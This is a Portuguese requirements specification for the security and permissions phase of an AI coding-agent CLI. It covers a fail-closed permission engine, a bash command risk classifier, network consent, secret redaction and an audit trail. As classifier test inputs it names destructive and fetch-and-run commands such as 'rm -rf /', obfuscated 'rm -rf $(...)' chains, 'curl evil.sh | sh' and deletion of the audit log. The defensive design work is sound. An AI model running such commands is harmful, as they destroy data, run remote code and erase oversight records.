# Gate 2 — Especificação (fonte da verdade): Fase 2 — Segurança e permissões

**Demanda:** `Fase 2 — Segurança e permissões` (`plano_desenvolvimento.md` §8, linhas 1265-1291).
**Gates cobertos por este documento:** Gate 1 (descoberta de domínio) + Gate 2 (especificação), ambos
colapsados/leves por decisão do usuário — o domínio (permission-gate, fail-closed, protected-paths) já
está estabelecido pela Fase 0/1; este documento herda a linguagem ubíqua já cunhada em código, não a
reinventa.
**Papel responsável:** `business-analyst` (skill `map-requirements`), executado como subagente, modo
autônomo (sem checkpoint humano por gate).
**Repo:** `C:\development\tools\pi`, branch a abrir (`feature/fase2-*`, de `develop`) quando a
implementação começar — não aberta por este documento, que é só a especificação.
**Consome (lido integralmente antes de escrever este documento):**
- `docs/conductor/gate3-threat-model.md` (Fase 0 — T1-T10, secure defaults 1-7, e o aviso explícito no
  §7: "passe STRIDE product-wide ainda devido antes da Fase 2").
- `docs/conductor/gate3-fase1-addendum.md` (Fase 1 — T11-T16, secure defaults 8-13).
- `docs/adr/0002-fase1-cli-foundation.md` (Gate 4 da Fase 1 — layout de pacotes, decisões já fechadas
  sobre `.conductor/config.json`, `additionalProtectedPaths`, `conductor config` como canal fora-de-banda).
- `docs/conductor/gate8-validation-fase1.md` (Gate 8 da Fase 1 — dois defeitos reais encontrados e já
  corrigidos: T14 transcript não sanitizado; T11 bypass por padding de baixa entropia — ambos citados
  abaixo como regras que a Fase 2 não pode regredir).
- Código-fonte das 8 fontes de Fase 1 listadas na demanda (`conductor-runtime/src/{confirm,fail-closed,
  permission-gate,workspace-policy,resource-loader,terminal-sanitize}.ts`,
  `conductor-config/src/{secret-detection,workspace-containment,schema-validation,schema,write-config}.ts`).
- `plano_desenvolvimento.md` §3.3 (fail-closed), §4.2 (`ToolPolicy`), §4.3 (5 níveis de permissão +
  protected paths), §4.9 (redação de sessão/export), §9.4 (categorias de teste de segurança), §10
  (invariantes), §14 (riscos principais).

**Aviso de cobertura herdado (não silenciado):** `gate3-fase1-addendum.md` §7 registra que um passe
STRIDE **product-wide** ainda é devido **antes** desta fase — cobrindo superfícies que este documento
**não** modela (extensions/skills de terceiros, subagentes, MCP, modo autônomo, fallback completo — ver
Non-goals abaixo). Este documento faz o Gate 1/2 (requisitos observáveis, testáveis); o Gate 3 (threat
model) desta fase é o próximo passo do fluxo, não este.

---

## 1. O que já existe vs. o que a Fase 2 constrói (evita reinventar)

| Capacidade | Fase 1 (já existe) | Fase 2 (constrói/estende) |
|---|---|---|
| Decisão fail-closed em erro de política | `fail-closed.ts` — `evaluatePolicyFailClosed` (T3) | Estender a mesma disciplina ao classificador de comando, ao consentimento de rede e à escrita do audit trail (hoje só cobre a avaliação de path/aprovação) |
| Bloqueio de caminho protegido | `workspace-policy.ts` — `evaluateToolPath`/`defaultProtectedPaths` (T1/T2/T13); já inclui `.conductor/config.json` e `.conductor/policy.json` **por antecipação** (o comentário do código já cita T13 para um `policy.json` que ainda não existe) | Criar `.conductor/policy.json` de fato (schema, leitura, escrita fora-de-banda); permitir que ele **declare** paths protegidos adicionais por projeto |
| Classificação de risco de comando | **Não existe.** `bash` hoje só tem `confirm()` binário (permission-gate.ts comentário: "a command-risk classifier is explicitly deferred to Fase 2") | Construir do zero: `command classifier` (low/medium/high/critical) |
| Consentimento de rede | **Não existe como conceito de tool-policy.** O único egress de rede hoje é (a) a chamada ao provedor de modelo, já fixada/consentida por configuração (Fase 0 T7), e (b) o ping opcional do `conductor doctor` a um backend de Library (ADR 0002 §7.2 item 4), que hoje **não** passa por nenhum gate | Formalizar o nível de permissão `Network` (plano §4.3): consentimento + registro de egress para qualquer chamada de rede além da chamada ao provedor já consentida por config |
| Detecção de segredo | `secret-detection.ts` — **bloqueia** a escrita de um segredo cru em `config.json` (T11), já com a correção do bypass por padding de baixa entropia (`gate8-validation-fase1.md` §6.2) | **Redação** (mascarar, não bloquear) em sinks que precisam continuar funcionando: audit trail, transcrito de chat, saída futura de `session export` |
| Sanitização de terminal | `terminal-sanitize.ts` — remove sequências ANSI/CSI/OSC antes de `ctx.ui.confirm()` (T14); `gate8-validation-fase1.md` §6.1 fechou o mesmo buraco em `transcript.ts` | Nenhuma mudança de comportamento aqui — mas a Fase 2 herda a **lição** de §6.1: "cada sink precisa da sua própria defesa" aplica-se igualmente à redação de segredo (ver BR-12) |
| Trilha de auditoria | `PermissionGateDecision`/`onDecision` (permission-gate.ts) — hoje é só um **hook em memória**, consumido pela status-line do `chat` | **Persistir** cada decisão em um log local, append-only, não apagável por ferramenta |
| Modo `--yes` | **Não existe.** | Construir do zero, com as regras de BR-3/BR-11 |
| Política por projeto | **Não existe arquivo.** `config.json` tem só `workspace.additionalProtectedPaths` (honor-system do usuário, não um motor de política) | Construir `.conductor/policy.json` (schema, validação, leitura na abertura de sessão) |

---

## 2. Goals

1. **G1 — Motor de permissão fail-closed de 5 níveis.** Read/Write/Exec/Network/Security (plano §4.3)
   como decisão explícita para **toda** ferramenta, não apenas write/edit/bash como hoje.
2. **G2 — Classificador de risco de comando.** Todo `bash` recebe um tier (low/medium/high/critical)
   antes da decisão de aprovação.
3. **G3 — Consentimento e registro de rede.** Toda operação de rede além da chamada já consentida ao
   provedor de modelo exige política de consentimento + gera evento de egress auditável.
4. **G4 — Pipeline de redação de segredo.** Segredos são mascarados (não apenas bloqueados) em todo sink
   que precisa permanecer funcional: audit trail, transcrito de chat, e (quando existir) `session export`.
5. **G5 — Trilha de auditoria persistente.** Toda decisão do motor de permissão (allow/deny) é gravada em
   um log local, append-only, protegido contra escrita por ferramenta.
6. **G6 — Extensão de protected-paths via política por projeto.** `.conductor/policy.json` existe,
   é validado por schema, e pode **adicionar** (nunca remover) paths protegidos.
7. **G7 — Modo `--yes` explícito e auditado.** Bypass de confirmação humana, opt-in por invocação, nunca
   sticky, nunca capaz de transformar um DENY em ALLOW.
8. **Critério de saída (herdado literalmente do plano §8):** nenhuma ferramenta de escrita, execução,
   rede ou segurança pode operar sem uma política correspondente — restated de forma testável nas
   seções 4 e 6 abaixo (FR-23/BR-2).

## 3. Non-goals (com justificativa — decisão desta BA, não do plano por omissão)

| Non-goal | Por que fica fora desta fase | Onde pertence |
|---|---|---|
| **Sandbox de processo/SO** (container, seccomp, namespaces) | O Pi não tem sandbox nativo por design (recon §9, `gate3-threat-model.md` §1) — a Fase 2 continua sendo uma camada de **política** dentro de um único processo confiado, não isolamento de kernel. Mudar isso seria reabrir uma decisão de arquitetura da Fase 0, não uma decisão desta BA. | Fora do roadmap nomeado no plano; se algum dia entrar, é uma fase própria |
| **RBAC multi-usuário / multi-tenant** | O produto é local-first, operador único (`gate3-threat-model.md` §6: "o operador é o próprio titular dos dados"). Nenhuma fase nomeada no plano introduz múltiplos usuários. | Não nomeado no plano |
| **Allowlist/assinatura/sandbox de extensions e skills de terceiros** | `ConductorResourceLoader` ainda trava `noExtensions: true`/`noSkills: true` (ADR 0002 §4.2) — não há nada para permitir/negar ainda, porque nada de terceiro é carregado. Construir um motor de confiança para uma superfície que não existe é generalidade especulativa. | Fase 3 (quando skills passam a carregar) |
| **Delegação a subagentes com orçamento/contexto isolado** | A ferramenta `task` não existe até a Fase 3 (plano §8 Fase 3 entregáveis). | Fase 3 |
| **MCP client/servidor** | Ferramenta `mcp` não existe até a Fase 9. O nível `Network` desta fase é desenhado para já cobrir uma futura chamada MCP por default-deny (BR-2), mas não implementa nada específico de MCP. | Fase 9 |
| **Fallback completo de provedor** (tier mínimo, cooldown, residência de dados) | Nomeado explicitamente como Fase 7 (`Model routing e provedores`, plano §1404). O nível `Network` cobre o *primitivo* de consentimento que um fallback usaria depois, não a política de fallback em si. | Fase 7 |
| **Integridade criptográfica do audit trail / session store** (assinatura, hash chain) | `ConductorSessionStore` (ADR 0001 §2.1) foi explicitamente adiado para a Fase 4, quando o schema de evidência existir (ADR 0002 §6). O audit trail desta fase é append-only em texto, não à prova de adulteração criptográfica. | Fase 4 |
| **Redesenho da superfície de status da TUI** (§4.16 do plano: gate atual, papel ativo, orçamento, subagentes, riscos pendentes) | Depende de dados que só existem a partir da Fase 3/4/8 (ADR 0002 §7.5 já mapeou isso fase a fase). Esta fase só precisa que o nível de permissão e o audit trail sejam **observáveis** de alguma forma (NFR-3), não que a TUI seja redesenhada. | Cresce organicamente Fase 3+ |
| **`conductor migrate` / compatibilidade `.cdt/`** | Fase 11 (Hardening e release). Não relacionado a permissões. | Fase 11 |
| **Prevenção de prompt injection** | Já reconhecido como impossível de prevenir pelo próprio Pi (`security.md`, citado em `gate3-threat-model.md` T5) — a Fase 2 **contém** melhor o raio de explosão (classificador, redação, audit trail), não resolve a causa raiz. | Não é um "não-fazer" desta fase por adiamento — é um limite estrutural já aceito desde a Fase 0 |

---

## 4. Glossário (linguagem ubíqua)

Termos já cunhados em código (Fase 0/1) são **reusados literalmente**, não redefinidos. Termos novos
desta fase são marcados **[NOVO]**.

| Termo | Definição | Fonte |
|---|---|---|
| **Permission Gate** | O hook único `pi.on("tool_call")` que intercepta toda chamada de ferramenta antes da execução — o chokepoint em si (mecanismo). | `permission-gate.ts` (Fase 0) |
| **Permission Engine** [NOVO — nomeia algo que já existia sem nome próprio] | A lógica de decisão que o Permission Gate consulta: hoje é a função `decideToolCall` embutida em `permission-gate.ts`; a Fase 2 a estende para consultar também o Command Classifier, o Protected Path set (incluindo o que `policy.json` declarar) e o nível `Network`. O Gate é o "onde"; o Engine é o "o quê decide". | Fase 1 (implícito) → nomeado nesta fase |
| **Permission Level** (nível de permissão) | Uma de cinco categorias fixas que toda ferramenta declara: Read, Write, Exec, Network, Security (plano §4.3). | `plano_desenvolvimento.md` §4.3 |
| **Risk Tier** (tier de risco) | low / medium / high / critical — classificação de uma chamada `bash` específica, produzida pelo Command Classifier. Distinto de Permission Level: o nível é da ferramenta (`bash` é sempre Exec); o tier é da **instância** da chamada (`ls` vs. `rm -rf /` são ambos Exec, tiers diferentes). | `plano_desenvolvimento.md` §4.2 (`ToolPolicy.risk`) |
| **Command Classifier** [NOVO] | Componente que atribui um Risk Tier a uma chamada `bash` (string de comando) antes do Permission Engine decidir se pede aprovação, autoaprova, ou nega incondicionalmente. | `gate3-fase1-addendum.md` §7 ("Classificador de risco de comando ... Fase 2"); `permission-gate.ts` comentário |
| **Protected Path** | Um caminho de arquivo (real, canonicalizado via `realpath`) que write/edit/bash nunca podem alcançar, independente de aprovação. Já existe para o home dir e para `.conductor/{config,policy}.json`. | `workspace-policy.ts` `defaultProtectedPaths` (T1/T2/T13, Fase 0/1) |
| **Protected-Path Extension** [NOVO — nome do entregável do plano] | A capacidade de `policy.json` **declarar** Protected Paths adicionais por projeto, aditivamente ao conjunto default embutido. | `plano_desenvolvimento.md` §8 Fase 2 entregáveis |
| **Network Permission** [NOVO] | O nível `Network` (plano §4.3) tornado operacional: qualquer chamada de rede que não seja a chamada já consentida ao provedor de modelo configurado exige uma entrada de política de consentimento e gera um Egress Event. | `plano_desenvolvimento.md` §4.3, invariante #17 |
| **Egress Event** [NOVO] | Uma entrada no Audit Trail registrando que uma operação de rede consentida de fato ocorreu (destino, ferramenta, timestamp). | `plano_desenvolvimento.md` invariante #17 |
| **Secret Scanner** | O mecanismo que reconhece um valor como "com forma de segredo" (prefixo conhecido ou alta entropia). Já existe, bloqueando escrita em `config.json`. | `secret-detection.ts` (T11, Fase 1) |
| **Redaction** / **Redaction Pipeline** [NOVO — separa um conceito que a Fase 1 não precisou separar] | Mascarar (substituir por um placeholder fixo, ex. `[REDACTED:api-key]`) um trecho de texto que contém algo com Secret Scanner-shape, em um sink que **precisa continuar funcionando** (não pode simplesmente negar a operação, como o Secret Scanner faz hoje em `config.json`). Reusa os mesmos matchers do Secret Scanner; aplica um resultado diferente (mascarar vs. recusar). | Nomeado nesta fase; distinto de "detecção" |
| **Audit Trail** / **Security Event Log** [NOVO] | Log local, append-only, não gravável por chamada de ferramenta, contendo toda decisão (allow/deny) do Permission Engine. Persistência do que `PermissionGateDecision` já emite hoje só em memória. | `plano_desenvolvimento.md` §8 Fase 2 entregáveis; `permission-gate.ts` `PermissionGateDecision` (Fase 1, hoje não persistido) |
| **`--yes` mode** [NOVO] | Flag de invocação explícita que faz o Permission Engine pular a etapa de confirmação humana (`ctx.ui.confirm()`) para decisões que já seriam ALLOW-com-aprovação; nunca transforma um DENY em ALLOW. | `plano_desenvolvimento.md` §8 Fase 2 entregáveis |
| **Policy por projeto / `policy.json`** [NOVO] | `.conductor/policy.json` — arquivo, versionado por schema como `config.json`, que declara Protected Paths adicionais, overrides de Risk Tier por padrão de comando, e política de consentimento de rede para o projeto. Ele próprio é um Protected Path (BR-4). | `plano_desenvolvimento.md` §8 Fase 2 entregáveis; anteriormente só comentado em código (`workspace-policy.ts`) |

---

## 5. Requisitos funcionais (FR)

Cada FR tem um critério de aceite Given/When/Then testável. IDs são estáveis para rastreabilidade no
Gate 8 desta fase.

### Grupo A — Command Classifier (G2)

**FR-1 — Toda chamada `bash` é classificada antes da decisão de aprovação.**
> Given uma chamada de ferramenta `bash` com `command: "ls -la"`,
> When o Permission Engine avalia a chamada,
> Then um Risk Tier (aqui, `low`) é atribuído **antes** de qualquer `ctx.ui.confirm()` ser disparado, e o
> tier resultante está disponível para a mensagem de aprovação e para o Audit Trail.

**FR-2 — Comando `critical` é negado incondicionalmente, sem caminho de aprovação.**
> Given uma chamada `bash` com `command: "rm -rf /"` (ou um padrão equivalente no conjunto default
> conservador do classificador),
> When o Permission Engine avalia a chamada,
> Then a decisão é `{ block: true }` **sem** chegar a chamar `ctx.ui.confirm()` — nem um humano disponível
> nem `--yes` produzem ALLOW (ver BR-8).

**FR-3 — `policy.json` pode rebaixar um comando específico para "autoaprovado" (low-risk + allowlist).**
> Given um `policy.json` com uma entrada allowlist para o padrão `"npm test"` marcada `low`,
> When o agente chama `bash` com `command: "npm test"`,
> Then a chamada executa **sem** `ctx.ui.confirm()`, e ainda assim gera uma entrada no Audit Trail
> (FR-16) registrando que foi autoaprovada por allowlist, não por `--yes` nem por aprovação humana.

**FR-4 — Falha de classificação nunca vira "low risk" silencioso.**
> Given um comando que o classifier não consegue analisar (ex.: string vazia, encoding inválido, erro
> interno do classifier),
> When o Permission Engine avalia a chamada,
> Then o tier resultante é `critical` (o tier de maior escrutínio) — nunca `low` — estendendo a mesma
> regra fail-closed de `fail-closed.ts` (T3) para a etapa de classificação (BR-1/BR-9).

**FR-5 — Comando composto/ofuscado não é subclassificado por esconder o verbo destrutivo.**
> Given uma chamada `bash` com `command: "echo safe && rm -rf $(malicious_expr)"`,
> When o classifier avalia a chamada,
> Then o tier resultante é, no mínimo, `high` (exige aprovação explícita) — a presença de `rm -rf` dentro
> de uma substituição de comando (`$()`), encadeamento (`&&`/`;`/`|`) ou crase não reduz o tier abaixo do
> que o verbo mais perigoso presente na string exigiria isoladamente.

### Grupo B — Network Permission (G3)

**FR-6 — Operação de rede sem política de consentimento é negada por padrão.**
> Given nenhuma entrada de política de rede consentindo um destino,
> When uma ferramenta tenta uma chamada classificada como nível `Network` (ex.: o ping opcional do
> `doctor` a um backend de Library, ou uma futura chamada MCP),
> Then a chamada é negada — `no policy declared for network destination "<host>" — fail closed` — mesmo
> comportamento default-deny que hoje já vale para ferramentas sem branch no Permission Engine (BR-2
> estendida ao nível Network).

**FR-7 — Operação de rede consentida gera um Egress Event auditável a cada ocorrência.**
> Given uma entrada de política consentindo o destino `library.internal:8080`,
> When o `doctor` executa seu ping opcional a esse destino,
> Then a chamada é permitida **e** uma entrada de Audit Trail é gravada com `permission: "network"`,
> destino, ferramenta chamadora e timestamp — satisfazendo o invariante #17 do plano ("operações de rede
> geram evento de egress").

**FR-8 — O ping de `doctor` ao backend de Library deixa de ser uma exceção não-controlada.**
> Given a Fase 1 já implementa esse ping diretamente (ADR 0002 §7.2 item 4), sem passar por nenhum gate,
> When a Fase 2 é entregue,
> Then esse ping passa a rotear pelo Network Permission (FR-6/FR-7) como qualquer outra chamada de rede —
> não é um caso "legado" isento da nova regra.

### Grupo C — Protected-Path Extension / `policy.json` (G6)

**FR-9 — `.conductor/policy.json` é, ele próprio, um Protected Path desde que exista.**
> Given um `.conductor/policy.json` presente no workspace,
> When o agente chama `write` ou `edit` tendo esse arquivo (ou seu real path pós-symlink) como alvo,
> Then a chamada é negada pelo Permission Engine **antes** de qualquer `ctx.ui.confirm()` — mesmo
> tratamento que `.conductor/config.json` já recebe hoje (T13) — e `--yes` não muda esse resultado
> (BR-3/BR-4).

**FR-10 — `policy.json` só pode adicionar Protected Paths, nunca remover um path default.**
> Given um `policy.json` que tenta (por erro humano ou maliciosamente) omitir/negar um path do conjunto
> default (ex.: reescrever a lista para excluir `~/.ssh`),
> When o Permission Engine carrega a política,
> Then o conjunto default embutido continua sendo aplicado **de qualquer forma** — a lista efetiva é
> sempre `defaults ∪ policy.json.protectedPaths`, nunca `policy.json.protectedPaths` sozinha (BR-5).

**FR-11 — Um path protegido por `policy.json` é negado da mesma forma independente de symlink/`../`.**
> Given `policy.json` declara `./secrets/` como protegido, e existe um symlink `./data/link -> ./secrets`
> dentro do workspace,
> When `write` tenta gravar em `./data/link/token.txt`,
> Then a chamada é negada — a checagem usa o real path canonicalizado (mesma disciplina de
> `resolveRealPath`/`isWithinRoot` já usada para os defaults), não uma comparação léxica.

### Grupo D — Redaction Pipeline (G4)

**FR-12 — Toda entrada do Audit Trail passa por redação antes de ser persistida.**
> Given uma decisão do Permission Engine cujo `reason` ou `input` capturado contém um valor com forma de
> segredo (ex.: uma variável de ambiente ecoada por um comando `bash`),
> When a entrada é gravada no Audit Trail,
> Then o valor secreto aparece mascarado (ex.: `[REDACTED:api-key]`) no arquivo persistido — nunca em
> texto plano — reusando os mesmos matchers de `secret-detection.ts`.

**FR-13 — O transcrito de chat ao vivo redige segredo, não só sanitiza terminal.**
> Given um resultado de `bash` cujo stdout contém `ANTHROPIC_API_KEY=sk-ant-api03-...`,
> When esse resultado é renderizado no transcrito da TUI,
> Then o valor após `=` aparece mascarado — fechando explicitamente a lacuna que `gate8-validation-fase1.md`
> §6.1 documentou (sanitização de terminal ≠ redação de segredo; a Fase 1 só resolveu a primeira).

**FR-14 — Segredo embutido em substring é redigido onde quer que apareça, não só quando é o campo inteiro.**
> Given um valor `"anthropic/sk-ant-api03-FAKEFAKEFAKEFAKE"` chegando a um sink coberto por redação,
> When a redação executa,
> Then o trecho `sk-ant-api03-FAKEFAKEFAKEFAKE` é mascarado e o restante (`anthropic/`) permanece legível —
> estendendo ao pipeline de redação a mesma correção de `\b` (word-boundary) que `gate8-validation-fase1.md`
> §6.2 já aplicou à detecção em `config.json` (T11), para que a mesma classe de bypass não reapareça em um
> sink novo.

**FR-15 — Redação não mascara conteúdo legítimo que apenas parece um segredo.**
> Given um SHA de commit Git de 40 caracteres hexadecimais aparecendo na saída de `bash`,
> When a redação executa,
> Then o SHA **não** é mascarado — reusa a mesma distinção de entropia/charset que `secret-detection.ts`
> já usa para não confundir um identificador hex comum com um segredo de alta entropia.

### Grupo E — Audit Trail (G5)

**FR-16 — Toda decisão do Permission Engine gera uma entrada de Audit Trail.**
> Given qualquer chamada de ferramenta, aprovada ou negada,
> When o Permission Engine retorna sua decisão,
> Then uma entrada é gravada contendo, no mínimo: timestamp ISO-8601 UTC, nome da ferramenta, Permission
> Level, Risk Tier (quando aplicável), decisão (allow/deny), motivo, se `--yes` foi usado, e se a
> aprovação foi humana, automática-por-allowlist, ou automática-por-`--yes`.

**FR-17 — O Audit Trail não pode ser apagado ou editado por uma chamada de ferramenta.**
> Given o arquivo de Audit Trail existente em `.conductor/`,
> When o agente chama `write`, `edit` ou `bash` (ex.: `rm .conductor/audit.jsonl`) tendo esse arquivo como
> alvo,
> Then a chamada é negada — o arquivo é tratado como Protected Path, simetricamente a `config.json`/
> `policy.json` (T13 estendido ao novo sink).

**FR-18 — Falha ao gravar uma entrada de auditoria nega a operação que ela audita.**
> Given o diretório `.conductor/` sem permissão de escrita (ex.: disco cheio, ACL restritiva),
> When uma chamada `write`/`edit`/`bash` que de outra forma seria aprovada tenta executar,
> Then a chamada é negada com motivo mencionando falha de gravação de auditoria — nenhuma ação que exija
> auditoria executa sem deixar rastro, estendendo fail-closed ao próprio sink de auditoria.

### Grupo F — Modo `--yes` (G7)

**FR-19 — `--yes` só existe como flag explícita de invocação, nunca como default persistido.**
> Given um `.conductor/config.json` ou `.conductor/policy.json` quaisquer,
> When esses arquivos são inspecionados,
> Then não existe nenhum campo que habilite `--yes` "para sempre" nesse projeto — a única forma de ativar
> é passar `--yes` na invocação (`conductor chat --yes`) daquela sessão específica.

**FR-20 — `--yes` nunca transforma um DENY em ALLOW.**
> Given `conductor chat --yes` ativo, e uma chamada `write` cujo alvo é `~/.ssh/authorized_keys`,
> When a chamada ocorre,
> Then ela é negada exatamente como sem `--yes` — a flag some apenas a etapa de `ctx.ui.confirm()`, nunca
> o resultado de Protected Path, de "sem política declarada", ou de Risk Tier `critical`.

**FR-21 — Toda auto-aprovação via `--yes` é distinguível no Audit Trail de uma aprovação humana.**
> Given `conductor chat --yes` ativo, e uma chamada `write` dentro do workspace que seria normalmente
> aprovada por um humano,
> When a chamada executa,
> Then a entrada de Audit Trail correspondente tem `approvalMethod: "yes-flag"` — nunca indistinguível de
> `approvalMethod: "human"`.

### Grupo G — Fail-closed / critério de saída do plano (G1, restatement testável)

**FR-22 — Ferramenta sem Permission Level declarado é negada (regressão obrigatória da Fase 0/1).**
> Given uma ferramenta nova, não catalogada em nenhum branch do Permission Engine (ex.: um custom tool
> registrado sem política),
> When ela é chamada,
> Then a decisão é `{ block: true, reason: 'no policy declared for tool "..." — fail closed' }` — mesmo
> comportamento que `permission-gate.ts` já implementa hoje; esta Fase 2 não pode regredi-lo.

**FR-23 — `policy.json` malformado nega tudo que exigiria política, não abre uma exceção silenciosa.**
> Given um `.conductor/policy.json` que não é JSON válido (erro de sintaxe),
> When uma sessão é aberta ou uma chamada Write/Exec/Network/Security ocorre,
> Then toda chamada desses níveis é negada nesta sessão com um motivo citando a falha de parse de
> `policy.json` — o Permission Engine **não** volta silenciosamente a usar só os defaults embutidos sem
> avisar, e **não** permite a operação assumindo "sem política = liberado".

**FR-24 — `policy.json` ausente é um estado válido (usa defaults), não um erro.**
> Given um projeto que nunca criou `.conductor/policy.json`,
> When uma sessão é aberta,
> Then o Permission Engine opera normalmente usando apenas os defaults embutidos (Fase 1) — nenhum erro,
> nenhuma negação geral — distinguindo explicitamente "ausente" (FR-24, ok) de "presente e malformado"
> (FR-23, nega tudo).

---

## 6. Requisitos não-funcionais (NFR)

**NFR-1 — Latência do Permission Engine não degrada o loop interativo (candidato de SLO, não fechado
aqui).**
> Given uma chamada de ferramenta comum (`read`, `write` pequeno, `bash` de um comando simples),
> When o Permission Engine decide (incluindo classificação + checagem de redação-elegível),
> Then a decisão adiciona um overhead perceptualmente desprezível ao turno — proposta inicial: **p95 <
> 50ms** de overhead **local** (excluindo o tempo de espera por aprovação humana). *Não fundamentado na
> biblioteca* (nenhum livro do corpus cobre orçamento de latência específico para gates de permissão de
> agente) — registrado como candidato a ser confirmado/ajustado no Gate 4 (SLO), não como número fechado
> por esta BA.

**NFR-2 — Concorrência: duas chamadas de ferramenta simultâneas não interferem uma na decisão da outra.**
> Given duas chamadas de ferramenta disparadas em paralelo na mesma sessão (ex.: um cenário futuro de
> subagente, ou duas chamadas no mesmo turno),
> When o Permission Engine avalia ambas,
> Then cada uma recebe uma decisão correta e independente, e cada uma gera sua própria entrada de Audit
> Trail sem uma sobrescrever/intercalar a outra (escrita append por linha, atômica por entrada).

**NFR-3 — Auditabilidade sem ferramental especial.**
> Given o Audit Trail persistido,
> When um humano (ou o `conductor doctor`) precisa inspecioná-lo,
> Then o formato é texto plano legível (JSONL, mesmo padrão já usado pelas sessões — ADR 0002 §5.2), sem
> exigir um visualizador dedicado para uma auditoria básica.

**NFR-4 — Não regressão: toda garantia de Fase 0/1 permanece válida.**
> Given a suíte de testes de Fase 0/1 (fail-closed, protected-paths, sanitização de terminal —
> `gate8-validation-fase1.md` §5),
> When a Fase 2 é integrada,
> Then nenhum teste existente é enfraquecido ou removido — apenas extensão aditiva, mesma disciplina que
> a própria Fase 1 já seguiu em relação à Fase 0.

**NFR-5 — Local-first: Audit Trail e `policy.json` não saem da máquina por padrão.**
> Given a trilha de auditoria e a política do projeto,
> When o produto opera normalmente,
> Then nenhum dado desses é transmitido para fora do dispositivo sem uma ação explícita e separada do
> usuário — consistente com o princípio "memória local-first" (`plano_desenvolvimento.md` §3.5).

---

## 7. Regras de negócio (BR)

1. **BR-1 (fail-closed, raiz):** qualquer avaliação de política que lance exceção, não complete, ou
   entregue um resultado ambíguo resulta em DENY — nunca ALLOW. Estende `fail-closed.ts` (T3) do escopo
   original (path/aprovação) para: classificação de comando, avaliação de consentimento de rede, e
   escrita de auditoria.
2. **BR-2 (sem política = nega):** qualquer ferramenta, de qualquer Permission Level (incluindo Network e
   Security, que hoje não têm nenhum branch), sem uma política explícita é negada (plano invariante #7,
   estendido dos 3 níveis já cobertos para os 5 do plano).
3. **BR-3 (`--yes` só pula confirmação, nunca nega→permite):** `--yes` pode eliminar a etapa de
   `ctx.ui.confirm()` para uma decisão que já seria ALLOW-com-aprovação; nunca transforma um DENY (path
   protegido, sem política, tier `critical`, rede não consentida) em ALLOW.
4. **BR-4 (`policy.json` é protegido):** nenhuma chamada `write`/`edit`, com ou sem `--yes`, pode
   modificar `.conductor/policy.json` — muda apenas fora de banda (edição humana, ou um comando dedicado
   `conductor policy set` simétrico a `conductor config set`, ADR 0002 §7.3).
5. **BR-5 (`policy.json` só adiciona, nunca remove):** a lista efetiva de Protected Paths é sempre
   `defaults ∪ policy.json`; `policy.json` nunca pode estreitar/remover um default embutido.
6. **BR-6 (auditoria antes/atômica com a execução):** toda decisão (allow ou deny) é registrada no Audit
   Trail antes de, ou atomicamente com, a ferramenta executar — nunca "melhor esforço depois" para uma
   ação que já teve efeito colateral.
7. **BR-7 (redação mascara, não apenas sinaliza):** em sinks que precisam continuar funcionando (audit
   trail, transcrito, export futuro), um segredo é substituído por um placeholder fixo — não é logado ao
   lado de um aviso, e não é reversível a partir do sink redigido.
8. **BR-8 (tier `critical` não tem caminho de aprovação):** um comando classificado `critical` é negado
   mesmo com um humano disponível para aprovar e mesmo com `--yes` — não existe, nesta fase, um jeito de
   autorizar um comando `critical` interativamente (mirror do exemplo "comando potencialmente destrutivo"
   em `plano_desenvolvimento.md` §3.3, tratado como DENY automático, não como aprovação-obrigatória).
9. **BR-9 (falha de classificação = tier mais alto):** se o Command Classifier não consegue determinar um
   tier, o resultado é `critical`, nunca `low` — mesma lógica de BR-1 aplicada à classificação.
10. **BR-10 (rede exige consentimento padrão + registro por destino novo):** uma operação `Network`
    precisa de uma entrada de política consentindo o destino **e** gera um Egress Event a cada ocorrência
    (plano §4.3: "requer consentimento e registro").
11. **BR-11 (auto-aprovação é distinguível):** toda entrada de auditoria registra explicitamente se a
    aprovação foi humana, por allowlist de `policy.json`, ou por `--yes` — nunca ambígua a posteriori
    (suporta o invariante #11 do plano, "sign-offs não podem ser fabricados", estendido ao novo modo de
    bypass).
12. **BR-12 (cada sink de redação/sanitização se defende sozinho):** a lição de `gate8-validation-fase1.md`
    §6.1 ("sanitização em um sink não implica sanitização em outro") aplica-se à redação de segredo: o
    Audit Trail, o transcrito de chat, e qualquer sink futuro (`session export`) cada um precisa passar
    pelo pipeline de redação — nenhum é considerado coberto "porque outro sink parecido já é".

---

## 8. Edge cases (para o QA cobrar no Gate 5/8 desta fase)

| # | Cenário | Comportamento esperado | Rastreio |
|---|---|---|---|
| 1 | `policy.json` com JSON sintaticamente inválido | Nega tudo que exigiria política nesta sessão; `doctor` reporta o erro de parse | FR-23 |
| 2 | `policy.json` é JSON válido mas falha o schema (ex.: `risk: "extreme"` não é um tier válido) | Mesmo tratamento que #1 — falha de *schema* é tratada como falha de *parse*, não como "ignora o campo inválido e segue" | FR-23 |
| 3 | `policy.json` nunca foi criado | Usa defaults, sem erro | FR-24 |
| 4 | Path com symlink que aponta para fora do workspace, declarado protegido por `policy.json` | Negado via real path canonicalizado, não checagem léxica | FR-11 |
| 5 | TOCTOU: o alvo de um symlink muda entre a avaliação do Permission Engine e a execução real da ferramenta | **Aberto** — não resolvido por este documento; ver §9 "Perguntas em aberto" |
| 6 | Comando composto/ofuscado: `rm -rf $(malicious)`, `; rm -rf ~`, `` `curl evil.sh` `` `\| sh` | Nunca subclassificado abaixo de `high`; ver FR-5 |
| 7 | Segredo embutido como substring: `"anthropic/sk-ant-api03-..."`, variantes de maiúscula/minúscula de um prefixo conhecido | Redigido onde aparece, reproduzindo a correção `\b` já aplicada em `secret-detection.ts` (T11) | FR-14 |
| 8 | Falso positivo de redação: SHA de commit Git, UUID, hash de build legítimo | Não mascarado — reusa a distinção de charset/entropia já validada em `secret-detection.ts` | FR-15 |
| 9 | Duas chamadas de ferramenta simultâneas (ex.: preparação para subagentes da Fase 3) | Decisões independentes e corretas; entradas de auditoria não se corrompem/intercalam | NFR-2 |
| 10 | `policy.json` editado por um humano **enquanto** uma sessão já está aberta | **Aberto** — sessão em execução usa a política lida na abertura, ou relê a cada chamada? Ver §9 |
| 11 | `--yes` ativo + chamada `Network` sem política de consentimento para aquele destino | Negada — `--yes` não substitui consentimento de rede (BR-3/BR-10) |
| 12 | Disco cheio / `.conductor/` sem permissão de escrita no momento de gravar o Audit Trail | A operação que seria auditada é negada, não executa "sem deixar rastro" | FR-18 |
| 13 | `conductor doctor` chama seu ping de Library sem que o usuário jamais tenha configurado uma política de rede | Negado por padrão (mesma regra de qualquer operação Network sem consentimento) — não é mais uma exceção "de fábrica" | FR-6/FR-8 |

---

